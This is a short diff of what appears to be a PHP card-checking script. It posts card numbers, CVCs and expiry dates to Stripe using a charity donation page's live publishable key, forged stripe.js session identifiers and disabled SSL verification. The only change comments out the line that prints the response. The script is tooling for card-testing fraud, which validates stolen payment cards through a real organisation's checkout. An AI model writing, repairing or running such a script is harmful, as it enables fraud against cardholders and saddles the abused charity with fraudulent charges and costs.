@@ -88,7 +88,7 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=95da8616-f593-4fdb-b65b-ee72d0a7cc56&muid=787c7ab2-8275-4a03-95c7-4874523120ac&sid=48b39956-61de-46a2-81fa-9bf01d1e69fa&pasted_fields=number&payment_user_agent=stripe.js%2Fce297a58%3B+stripe-js-v3%2Fce297a58&time_on_page=87117&referrer=https%3A%2F%2Fgive.salvationarmyusa.org%2Fgive%2F164006%2F&key=pk_live_h5ocNWNpicLCfBJvLialXsb900SaJnJscz');
-echo $result = curl_exec($ch);
+//echo $result = curl_exec($ch);
 
 // $token = trim(strip_tags(getStr($result,'"id": "','"')));
 
